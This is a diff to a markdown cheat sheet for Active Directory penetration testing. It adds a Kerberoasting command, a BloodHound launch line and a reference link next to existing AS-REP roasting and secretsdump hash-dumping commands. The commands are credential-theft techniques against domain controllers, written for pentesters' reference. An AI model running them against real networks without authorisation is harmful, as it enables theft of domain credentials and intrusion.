@@ -34,6 +34,8 @@ GetNPUsers:
 
 `sudo python3 GetNPUsers.py <Domain Controller>/ -dc-ip <IP> -request`
 
+Kerberoasting: `sudo python3 GetUsersSPNs.py <Domain Controller>/<Valid Username> -dc-ip <IP> -request`
+
 Hash Dump After DCSync
 
 SecretsDump: `sudo python3 secretsdump.py <Domain Controller>/<New Username>@<IP>`
@@ -49,6 +51,8 @@ Install: `sudo pip3 install bloodhound && wget https://github.com/BloodHoundAD/B
 Get Info: `bloodhound-python -d <Domain Controller> -u <Valid Username> -p <Password> -gc <Gloabl Catalog> -c all -ns <IP>`
 
 Neo4j Console: `neo4j console`
+
+BloodHound: `./BloodHound --no-sandbox`
 
 # PowerView
 
@@ -76,5 +80,4 @@ Import PowerView
 
 [PowerView 3.0 Tips & Tricks](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
 
-
-kuberoasting
+[Pentesting Active Directory II](https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/)
